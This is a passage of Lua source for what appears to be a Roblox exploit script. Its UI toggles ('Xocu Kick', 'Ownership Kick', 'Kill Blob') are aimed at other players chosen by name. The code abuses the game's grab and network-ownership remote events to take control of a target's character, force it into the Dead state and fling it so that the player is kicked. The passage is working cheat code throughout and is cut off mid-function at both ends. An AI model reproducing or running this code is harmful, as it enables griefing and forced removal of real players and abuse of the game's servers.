                        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                        local L_Det = blobman:FindFirstChild("LeftDetector")
                        local R_Det = blobman:FindFirstChild("RightDetector")
                        
                        local L_Weld = L_Det and (L_Det:FindFirstChild("LeftWeld") or L_Det:FindFirstChild("RigidConstraint"))
                        local R_Weld = R_Det and (R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChild("RigidConstraint"))

                        if targetHRP and grab and drop and L_Weld and R_Weld then
                            pcall(function()
                                grab:FireServer(L_Det, targetHRP, L_Weld)
                                grab:FireServer(R_Det, targetHRP, R_Weld)
                                drop:FireServer(L_Weld, targetHRP)
                                drop:FireServer(R_Weld, targetHRP)
                            end)
                        end
                        
                        task.wait() 
                    end
                end)

            elseif selectedBlobMode == "XOCU Kill Blob [Fast]" then
                blobTask = task.spawn(function()
                    while blobActive do
                        pcall(function()
                            local char = LocalPlayer.Character
                            local seat = char and char.Humanoid.SeatPart
                            local Blob = seat and seat.Parent
                            
                            if Blob and Blob.Name == "CreatureBlobman" then
                                local remotes = Blob:FindFirstChild("BlobmanSeatAndOwnerScript")
                                local CG = remotes and remotes:FindFirstChild("CreatureGrab")
                                local CD = remotes and remotes:FindFirstChild("CreatureRelease")
                                local weld = Blob.RightDetector:FindFirstChild("RightWeld") or Blob.RightDetector:FindFirstChild("RigidConstraint")
                                
                                local HRP = Blob.HumanoidRootPart
                                local pos = HRP.CFrame

                                local target = selectedKickPlayer
                                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.Humanoid.Health > 0 then
                                    HRP.CFrame = target.Character.HumanoidRootPart.CFrame
                                    task.wait(0.05)
                                    
                                    local startTime = tick()
                                    repeat 
                                        CG:FireServer(nil, target.Character.HumanoidRootPart, weld)
                                        CD:FireServer(weld)
                                        HRP.CFrame = target.Character.HumanoidRootPart.CFrame
                                        task.wait() 
                                    until not blobActive or isnetworkowner(target.Character.HumanoidRootPart) or (tick() - startTime > 2)
                                    
                                    target.Character.Humanoid:ChangeState("Dead")
                                    if stvel then 
                                        stvel(HRP) 
                                    end
                                    HRP.CFrame = pos
                                end
                            end
                        end)

                        if not blobActive then break end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })
end

do
    local oatsKickActive = false
    local oatsKickTask = nil

    ChooseGroup:CreateToggle({
        Name = "Xocu Kick(Best)",
        Flag = "OatsKick",
        Default = false,
        Callback = function(Value)
            if SetToggleState then SetToggleState("OatsKick", Value) end
            oatsKickActive = Value
            
            local function sno(part)
                pcall(function()
                    local grabEvents = game:GetService("ReplicatedStorage"):FindFirstChild("GrabEvents")
                    local setNetOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
                    if setNetOwner then
                        setNetOwner:FireServer(part, part.CFrame)
                    end
                end)
            end
            
            if Value then
                local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                if not targetName or targetName == "" then
                    oatsKickActive = false
                    Library:Notify({ Title = "Error", Content = "Select target first!", Duration = 3 })
                    if SetToggleState then SetToggleState("OatsKick", false) end
                    return
                end
                
                oatsKickTask = task.spawn(function()
                    local RunService = game:GetService("RunService")
                    local ReplicatedStorage = game:GetService("ReplicatedStorage")
                    
                    local myChar = LocalPlayer.Character
                    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not (myChar and myHRP) then
                        oatsKickActive = false
                        return
                    end

                    local savedPos = myHRP.CFrame
                    local lastRemoteFire = tick()

                    while oatsKickActive and RunService.Heartbeat:Wait() do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local targetPlayer = currentTargetName and game:GetService("Players"):FindFirstChild(currentTargetName)
                        
                        -- Target validation fix to prevent errors if target leaves or resets
                        if not targetPlayer or not targetPlayer.Character then
                            break
                        end

                        myChar = LocalPlayer.Character
                        myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        local myHead = myChar and myChar:FindFirstChild("Head")

                        local tChar = targetPlayer.Character
                        local tHRP = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar and tChar:FindFirstChild("Humanoid")

                        if not (myChar and myHRP and myHead) or not (tHRP and tHum) or tHum.Health <= 0 then
                            continue
                        end

                        local dist = (tHRP.Position - myHRP.Position).Magnitude

                        if dist > 30 then
                            pcall(function()
                                myChar:PivotTo(tHRP.CFrame * CFrame.new(0, 2, 4))
                            end)
                            
                            sno(tHRP)

                            if not tHRP:FindFirstChild("KickAlign") then
                                local oldBp = tHRP:FindFirstChildOfClass("BodyPosition")
                                if oldBp then oldBp:Destroy() end

                                local att0 = Instance.new("Attachment", tHRP)
                                att0.Name = "KickAtt0"
                                
                                local att1 = Instance.new("Attachment", workspace.Terrain)
                                att1.Name = "KickAtt1"

                                local alignPos = Instance.new("AlignPosition")
                                alignPos.Name = "KickAlign"
                                alignPos.Attachment0 = att0
                                alignPos.Attachment1 = att1
                                alignPos.MaxForce = math.huge
                                alignPos.Responsiveness = 200
                                alignPos.Parent = tHRP

                                local alignRot = Instance.new("AlignOrientation")
                                alignRot.Name = "KickRot"
                                alignRot.Attachment0 = att0
                                alignRot.Mode = Enum.OrientationAlignmentMode.OneAttachment
                                alignRot.CFrame = CFrame.new() 
                                alignRot.MaxTorque = math.huge
                                alignRot.Responsiveness = 200
                                alignRot.Parent = tHRP
                            end

                            local grabStartTime = tick()
                            while (tick() - grabStartTime) < 0.3 and oatsKickActive do
                                task.wait(0.05)
                                sno(tHRP)
                                pcall(function()
                                    local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
                                    local destroyLine = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine")
                                    if destroyLine then
                                        destroyLine:FireServer(tHRP)
                                    end
                                end)
                                
                                local align = tHRP:FindFirstChild("KickAlign")
                                if myHead and align and align.Attachment1 then
                                    align.Attachment1.WorldPosition = myHead.Position + Vector3.new(0, 15, 0)
                                end
                            end

                            if oatsKickActive then
                                pcall(function()
                                    myChar:PivotTo(savedPos)
                                    tHRP.CFrame = savedPos * CFrame.new(0, 15, 0)
                                end)
                            end
                            
                            continue
                        end

                        if not tHRP:FindFirstChild("KickAlign") then
                            local oldBp = tHRP:FindFirstChildOfClass("BodyPosition")
                            if oldBp then oldBp:Destroy() end

                            local att0 = Instance.new("Attachment", tHRP)
                            att0.Name = "KickAtt0"
                            
                            local att1 = Instance.new("Attachment", workspace.Terrain)
                            att1.Name = "KickAtt1"

                            local alignPos = Instance.new("AlignPosition")
                            alignPos.Name = "KickAlign"
                            alignPos.Attachment0 = att0
                            alignPos.Attachment1 = att1
                            alignPos.MaxForce = math.huge
                            alignPos.Responsiveness = 200
                            alignPos.Parent = tHRP

                            local alignRot = Instance.new("AlignOrientation")
                            alignRot.Name = "KickRot"
                            alignRot.Attachment0 = att0
                            alignRot.Mode = Enum.OrientationAlignmentMode.OneAttachment
                            alignRot.CFrame = CFrame.new() 
                            alignRot.MaxTorque = math.huge
                            alignRot.Responsiveness = 200
                            alignRot.Parent = tHRP
                        end

                        sno(tHRP)

                        local align = tHRP:FindFirstChild("KickAlign")
                        if align and align.Attachment1 and oatsKickActive then
                            align.Attachment1.WorldPosition = myHead.Position + Vector3.new(0, 20, 0)
                        end

                        local rot = tHRP:FindFirstChild("KickRot")
                        if rot then 
                            rot.CFrame = CFrame.Angles(0, 0, 0) 
                        end

                        if tick() - lastRemoteFire > 0.05 and oatsKickActive then
                            pcall(function()
                                local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
                                local destroyLine = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine")
                                if destroyLine then
                                    destroyLine:FireServer(tHRP)
                                end
                            end)
                            lastRemoteFire = tick()
                        end
                    end

                    -- Cleanup logic for target when toggle is disabled internally
                    local finalTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                    local finalTarget = finalTargetName and game:GetService("Players"):FindFirstChild(finalTargetName)
                    
                    if finalTarget and finalTarget.Character then
                        local tH = finalTarget.Character:FindFirstChild("HumanoidRootPart")
                        if tH then
                            local align = tH:FindFirstChild("KickAlign")
                            local rot = tH:FindFirstChild("KickRot")
                            local att0 = tH:FindFirstChild("KickAtt0")
                            
                            if align then 
                                if align.Attachment1 then align.Attachment1:Destroy() end
                                align:Destroy() 
                            end
                            if rot then rot:Destroy() end
                            if att0 then att0:Destroy() end

                            pcall(function()
                                local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
                                local destroyLine = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine")
                                if destroyLine then
                                    destroyLine:FireServer(tH)
                                end
                            end)
                        end
                    end

                    oatsKickActive = false
                end)
            else
                oatsKickActive = false
                if oatsKickTask then
                    task.cancel(oatsKickTask)
                    oatsKickTask = nil
                end
                
                local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                local targetPlayer = currentTargetName and game:GetService("Players"):FindFirstChild(currentTargetName)
                
                if targetPlayer and targetPlayer.Character then
                    local tH = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if tH then
                        local align = tH:FindFirstChild("KickAlign")
                        local rot = tH:FindFirstChild("KickRot")
                        local att0 = tH:FindFirstChild("KickAtt0")
                        
                        if align then 
                            if align.Attachment1 then align.Attachment1:Destroy() end
                            align:Destroy() 
                        end
                        if rot then rot:Destroy() end
                        if att0 then att0:Destroy() end

                        pcall(function()
                            local grabEvents = game:GetService("ReplicatedStorage"):FindFirstChild("GrabEvents")
                            local destroyLine = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine")
                            if destroyLine then
                                destroyLine:FireServer(tH)
                            end
                        end)
                    end
                end
            end
        end
    })
end

do
    local modeOptions = {
        "Xocu Ownership Kick(80+ fps)",
        "Ownership Kick fast",
        "Ownership Kick For Exploiter",
        "Xocu UPGRADED Ownership Kick"
    }

    local selectedKickMode = "Xocu Ownership Kick"
    local ownershipKickActive = false
    local ownershipKickTask = nil
    local ownershipKickConnections = {}

    local function cleanupConnections()
        for _, conn in ipairs(ownershipKickConnections) do
            pcall(function() conn:Disconnect() end)
        end
        ownershipKickConnections = {}
        if ownershipKickTask then
            task.cancel(ownershipKickTask)
            ownershipKickTask = nil
        end
        ownershipKickActive = false
        
        pcall(function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local root = LocalPlayer.Character.HumanoidRootPart
                root.Anchored = false
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end)
    end

    ChooseGroup:CreateDropdown({
        Name = "Select Ownership Mode",
        Items = modeOptions,
        Default = "Xocu Ownership Kick(80+ fps)",
        Callback = function(Value)
            selectedKickMode = Value
        end
    })

    ChooseGroup:CreateToggle({
        Name = "Enable Ownership Kick",
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupConnections()
                return
            end

            if ownershipKickActive then
                cleanupConnections()
            end

            ownershipKickActive = Value

            local targetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
            if not targetName or targetName == "" then
                Library:Notify({ Title = "Error", Description = "Select target first!", Duration = 3 })
                ownershipKickActive = false
                return
            end

            local mode = selectedKickMode

            ownershipKickTask = task.spawn(function()
                local Players = game:GetService("Players")
                local RunService = game:GetService("RunService")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Workspace = game:GetService("Workspace")
                local LocalPlayer = Players.LocalPlayer

                local target = Players:FindFirstChild(targetName)
                if not target then
                    ownershipKickActive = false
                    return
                end

                local GE = ReplicatedStorage:WaitForChild("GrabEvents")
                local SetNetOwner = GE:WaitForChild("SetNetworkOwner")
                local DestroyGrabLine = GE:WaitForChild("DestroyGrabLine")
                
                local ZERO_VECTOR = Vector3.new(0, 0, 0)
                local HIDDEN_CF = CFrame.new(0, 1e9, 0)

                if mode == "Xocu Ownership Kick(80+ fps)" then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end

                    local savedPos = myRoot.CFrame 
                    local dragging = false
                    local grabStartTime = 0
                    local checkStartTime = 0
                    
                    local currentFPS = 60
                    local fpsConnection = RunService.RenderStepped:Connect(function(dt)
                        currentFPS = 1 / dt
                    end)
                    table.insert(ownershipKickConnections, fpsConnection)

                    local bodyPos = nil
                    local bodyGyro = nil

                    local function cleanupBodies()
                        pcall(function()
                            if bodyPos then bodyPos:Destroy() bodyPos = nil end
                            if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
                        end)
                    end

                    local function createBodies(targetRoot, pos)
                        cleanupBodies()
                        
                        for _, v in pairs(targetRoot:GetChildren()) do
                            if v:IsA("BodyPosition") or v:IsA("BodyGyro") then
                                v:Destroy()
                            end
                        end
                        
                        bodyPos = Instance.new("BodyPosition")
                        bodyPos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        bodyPos.D = 100
                        bodyPos.Position = pos
                        bodyPos.Parent = targetRoot
                        
                        bodyGyro = Instance.new("BodyGyro")
                        bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        bodyGyro.D = 100
                        bodyGyro.CFrame = CFrame.new(pos)
                        bodyGyro.Parent = targetRoot
                    end

                    while ownershipKickActive do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local currentTarget = currentTargetName and Players:FindFirstChild(currentTargetName)
                        
                        if not currentTarget or not currentTarget.Character or not currentTarget.Parent then 
                            cleanupBodies()
                            break 
                        end
                        
                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        local tChar = currentTarget.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar and tChar:FindFirstChild("Humanoid")
                        
                        if tRoot and tHum and tHum.Health > 0 and myRoot then
                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                cleanupBodies()
                                checkStartTime = 0
                                
                                pcall(function()
                                    tHum.PlatformStand = true
                                    tHum.Sit = true
                                    if GE:FindFirstChild("SetNetworkOwner") then GE.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end
                                    if GE:FindFirstChild("SetNetworkOwner") then GE.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end
                                    if GE:FindFirstChild("DestroyGrabLine") then GE.DestroyGrabLine:FireServer(tRoot) end
                                end)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.15 then
                                    dragging = true
                                    grabStartTime = 0
                                    checkStartTime = tick()
                                    local lockPos = savedPos * CFrame.new(5, 20, 4)
                                    createBodies(tRoot, lockPos.Position)
                                end
                            else
                                myRoot.CFrame = savedPos
                                local lockPos = savedPos * CFrame.new(5, 20, 4)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if bodyPos and bodyPos.Parent then
                                    bodyPos.Position = lockPos.Position
                                    if bodyGyro then
                                        bodyGyro.CFrame = lockPos
                                    end
                                else
                                    createBodies(tRoot, lockPos.Position)
                                end
                                
                                tHum.PlatformStand = true
                                
                                pcall(function()
                                    if GE:FindFirstChild("SetNetworkOwner") and GE:FindFirstChild("DestroyGrabLine") then
                                        if currentFPS > 200 then
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        elseif currentFPS >= 155 and currentFPS <= 200 then
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        else 
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        end
                                    end
                                end)
                                
                                if checkStartTime > 0 and tick() - checkStartTime > 0.15 then
                                    local currentDist = (tRoot.Position - lockPos.Position).Magnitude
                                    
                                    if currentDist > 10 then
                                        dragging = false
                                        grabStartTime = 0
                                        checkStartTime = 0
                                        cleanupBodies()
                                        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                    else
                                        checkStartTime = tick()
                                    end
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                            checkStartTime = 0
                            cleanupBodies()
                        end
                        RunService.Heartbeat:Wait()
                    end
                    
                    cleanupBodies()
                    if myRoot then myRoot.CFrame = savedPos end
                    
                elseif mode == "Xocu UPGRADED Ownership Kick" then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame 
                    local dragging = false
                    local grabStartTime = 0
                    local checkStartTime = 0
                    
                    local bodyPos = nil
                    local bodyGyro = nil

                    local function cleanupBodies()
                        pcall(function()
                            if bodyPos then bodyPos:Destroy() bodyPos = nil end
                            if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
                        end)
                    end

                    local function createBodies(targetRoot, pos)
                        cleanupBodies()
                        
                        for _, v in pairs(targetRoot:GetChildren()) do
                            if v:IsA("BodyPosition") or v:IsA("BodyGyro") then
                                v:Destroy()
                            end
                        end
                        
                        bodyPos = Instance.new("BodyPosition")
                        bodyPos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        bodyPos.D = 500
                        bodyPos.P = 100000
                        bodyPos.Position = pos
                        bodyPos.Parent = targetRoot
                        
                        bodyGyro = Instance.new("BodyGyro")
                        bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        bodyGyro.D = 500
                        bodyGyro.P = 100000
                        bodyGyro.CFrame = CFrame.new(pos)
                        bodyGyro.Parent = targetRoot
                    end

                    while ownershipKickActive do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local currentTarget = currentTargetName and Players:FindFirstChild(currentTargetName)
                        
                        if not currentTarget or not currentTarget.Character or not currentTarget.Parent then 
                            cleanupBodies()
                            break 
                        end
                        
                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        local tChar = currentTarget.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local tHum = tChar and tChar:FindFirstChild("Humanoid")
                        
                        if tRoot and tHum and tHum.Health > 0 and myRoot then
                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                cleanupBodies()
                                checkStartTime = 0
                                
                                pcall(function()
                                    tHum.PlatformStand = true
                                    tHum.Sit = true
                                    SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                    SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                    DestroyGrabLine:FireServer(tRoot)
                                end)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.2 then
                                    dragging = true
                                    grabStartTime = 0
                                    checkStartTime = tick()
                                    local lockPos = savedPos * CFrame.new(5, 20, 4)
                                    createBodies(tRoot, lockPos.Position)
                                end
                            else
                                myRoot.CFrame = savedPos
                                local lockPos = savedPos * CFrame.new(5, 20, 4)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if bodyPos and bodyPos.Parent then
                                    bodyPos.Position = lockPos.Position
                                    if bodyGyro then
                                        bodyGyro.CFrame = lockPos
                                    end
                                else
                                    createBodies(tRoot, lockPos.Position)
                                end
                                
                                tHum.PlatformStand = true
                                
                                pcall(function()
                                    for i = 1, 4 do
                                        SetNetOwner:FireServer(tRoot, lockPos)
                                    end
                                    DestroyGrabLine:FireServer(tRoot)
                                end)
                                
                                if checkStartTime > 0 and tick() - checkStartTime > 0.2 then
                                    local currentDist = (tRoot.Position - lockPos.Position).Magnitude
                                    
                                    if currentDist > 15 then
                                        dragging = false
                                        grabStartTime = 0
                                        checkStartTime = 0
                                        cleanupBodies()
                                        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                    else
                                        checkStartTime = tick()
                                    end
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                            checkStartTime = 0
                            cleanupBodies()
                        end
                        RunService.Heartbeat:Wait()
                    end
                    
                    cleanupBodies()
                    if myRoot then myRoot.CFrame = savedPos end
                    
                elseif mode == "Ownership Kick fast" then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame
                    local isGrabbing = false
                    local startTime = nil
                    local lastPalletTime = 0
                    local checkStartTime = nil
                    local grabAttemptStartTime = nil
                    local currentTargetRoot = nil
                    local attachments = {}

                    local spawnTask = task.spawn(function()
                        while ownershipKickActive and target and target.Parent do
                            local tChar = target.Character
                            local tRootActual = tChar and tChar:FindFirstChild("HumanoidRootPart")
                            if tRootActual then
                                pcall(function()
                                    SetNetOwner:FireServer(tRootActual, tRootActual.CFrame)
                                    tRootActual.AssemblyLinearVelocity = ZERO_VECTOR
                                    tRootActual.AssemblyAngularVelocity = ZERO_VECTOR
                                end)
                            end
                            task.wait(0.02)
                        end
                    end)
                    table.insert(ownershipKickConnections, spawnTask)

                    local function cleanupPhysicsObjects()
                        isGrabbing = false
                        currentTargetRoot = nil
                        for _, v in pairs(attachments) do
                            if v then pcall(function() v:Destroy() end) end
                        end
                        attachments = {}
                    end

                    local function isTargetAlive()
                        if not target or not target.Parent then return false end
                        local char = target.Character
                        if not char then return false end
                        local hum = char:FindFirstChild("Humanoid")
                        if not hum or hum.Health <= 0 then return false end
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if not root then return false end
                        if root ~= currentTargetRoot then currentTargetRoot = root end
                        return true
                    end

                    local MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                    local pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                    if not pallet and LocalPlayer.CanSpawnToy.Value then
                        pcall(function()
                            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("PalletLightBrown", HIDDEN_CF, Vector3.new(0, -90, 0))
                        end)
                        task.wait(0.5)
                        MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                    end
                    local soundPart = pallet and pallet:FindFirstChild("SoundPart")
                    if not soundPart then
                        ownershipKickActive = false
                        return
                    end

                    while ownershipKickActive and target do
                        RunService.Stepped:Wait()
                        
                        if not isTargetAlive() then
                            cleanupPhysicsObjects()
                            local waitStart = tick()
                            while ownershipKickActive and target and tick() - waitStart < 0.5 do
                                if isTargetAlive() then break end
                                task.wait(0.1)
                            end
                            if not isTargetAlive() then
                                savedPos = myRoot.CFrame
                                startTime = nil
                                grabAttemptStartTime = nil
                                checkStartTime = nil
                            end
                            task.wait(0.1)
                            continue
                        end

                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if not myRoot then 
                            task.wait()
                            continue 
                        end
                        
                        local tChar = target.Character
                        local tHum = tChar and tChar:FindFirstChild("Humanoid")
                        local tRoot = currentTargetRoot

                        if tRoot then
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            local limbs = {"Left Leg", "Right Leg", "Left Arm", "Right Arm", "Head", "Torso", "UpperTorso", "LowerTorso"}
                            for _, limbName in ipairs(limbs) do
                                local part = tChar:FindFirstChild(limbName)
                                if part then 
                                    part.Velocity = ZERO_VECTOR 
                                    part.RotVelocity = ZERO_VECTOR 
                                    part.CanCollide = false 
                                end
                            end
                        end

                        if not isGrabbing then
                            myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -6, -10)
                            myRoot.Velocity = ZERO_VECTOR
                            if not grabAttemptStartTime then grabAttemptStartTime = tick() end
                            tHum.PlatformStand = true
                            tHum.Sit = false
                            if not startTime then startTime = tick() end
                            if tick() - startTime > 0.05 then
                                isGrabbing = true
                                startTime = nil
                                grabAttemptStartTime = nil
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                
                                local att0 = Instance.new("Attachment", tRoot)
                                local att1 = Instance.new("Attachment", myRoot)
                                att1.CFrame = CFrame.new(0, 12, 0)
                                
                                local ap = Instance.new("AlignPosition", tRoot)
                                ap.Attachment0 = att0 
                                ap.Attachment1 = att1
                                ap.MaxForce = math.huge 
                                ap.MaxVelocity = math.huge
                                ap.Responsiveness = 200 
                                ap.ApplyAtCenterOfMass = true
                                
                                local ao = Instance.new("AlignOrientation", tRoot)
                                ao.Attachment0 = att0 
                                ao.Attachment1 = att1
                                ao.MaxTorque = math.huge 
                                ao.Responsiveness = 200
                                
                                attachments.att0 = att0 
                                attachments.att1 = att1
                                attachments.ap = ap 
                                attachments.ao = ao
                                tHum:ChangeState(Enum.HumanoidStateType.Physics)
                            end
                        else
                            if attachments.att1 then 
                                attachments.att1.CFrame = CFrame.new(0, 16.5, 0) 
                            end
                            
                            if not isTargetAlive() then
                                cleanupPhysicsObjects()
                                savedPos = myRoot.CFrame
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                task.wait(0.1)
                                continue
                            end
                            
                            tRoot = currentTargetRoot
                            if not checkStartTime then checkStartTime = tick() + 0.25 end
                            if checkStartTime and tick() >= checkStartTime then
                                local currentDistance = (myRoot.Position - tRoot.Position).Magnitude
                                if currentDistance > 29 then
                                    cleanupPhysicsObjects()
                                    isGrabbing = false
                                    startTime = tick()
                                    grabAttemptStartTime = nil
                                    checkStartTime = nil
                                    savedPos = myRoot.CFrame
                                    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -8, 0)
                                    myRoot.Velocity = ZERO_VECTOR
                                    pcall(function()
                                        SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                        DestroyGrabLine:FireServer(tRoot)
                                    end)
                                    task.wait()
                                    continue
                                end
                            end
                            
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            
                            local currentTime = tick()
                            if currentTime - lastPalletTime >= 0.02 then
                                lastPalletTime = currentTime
                                soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                pcall(function()
                                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                                end)
                                task.wait()
                                soundPart.CFrame = HIDDEN_CF
                            end
                        end
                        task.wait()
                    end
                    
                    cleanupPhysicsObjects()
                    if myRoot and savedPos then 
                        myRoot.CFrame = savedPos 
                    end

                elseif mode == "Ownership Kick For Exploiter" then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame
                    local isGrabbing = false
                    local startTime = nil
                    local lastPalletTime = 0
                    local checkStartTime = nil
                    local grabAttemptStartTime = nil
                    local currentTargetRoot = nil
                    local attachments = {}

                    local spawnTask = task.spawn(function()
                        while ownershipKickActive and target and target.Parent do
                            local tChar = target.Character
                            local tRootActual = tChar and tChar:FindFirstChild("HumanoidRootPart")
                            if tRootActual then
                                pcall(function()
                                    SetNetOwner:FireServer(tRootActual, tRootActual.CFrame)
                                    tRootActual.AssemblyLinearVelocity = ZERO_VECTOR
                                    tRootActual.AssemblyAngularVelocity = ZERO_VECTOR
                                end)
                            end
                            task.wait(0.011)
                        end
                    end)
                    table.insert(ownershipKickConnections, spawnTask)

                    local function cleanupPhysicsObjects()
                        isGrabbing = false
                        currentTargetRoot = nil
                        for _, v in pairs(attachments) do
                            if v then pcall(function() v:Destroy() end) end
                        end
                        attachments = {}
                    end

                    local function isTargetAlive()
                        if not target or not target.Parent then return false end
                        local char = target.Character
                        if not char then return false end
                        local hum = char:FindFirstChild("Humanoid")
                        if not hum or hum.Health <= 0 then return false end
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if not root then return false end
                        if root ~= currentTargetRoot then currentTargetRoot = root end
                        return true
                    end

                    local MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                    local pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                    if not pallet and LocalPlayer.CanSpawnToy.Value then
                        pcall(function()
                            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("PalletLightBrown", HIDDEN_CF, Vector3.new(0, -90, 0))
                        end)
                        task.wait(0.5)
                        MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                    end
                    local soundPart = pallet and pallet:FindFirstChild("SoundPart")
                    if not soundPart then
                        ownershipKickActive = false
                        return
                    end

                    while ownershipKickActive and target do
                        task.wait(0.0010416666666667)
                        
                        if not isTargetAlive() then
                            cleanupPhysicsObjects()
                            local waitStart = tick()
                            while ownershipKickActive and target and tick() - waitStart < 0.5 do
                                if isTargetAlive() then break end
                                task.wait(0.1)
                            end
                            if not isTargetAlive() then
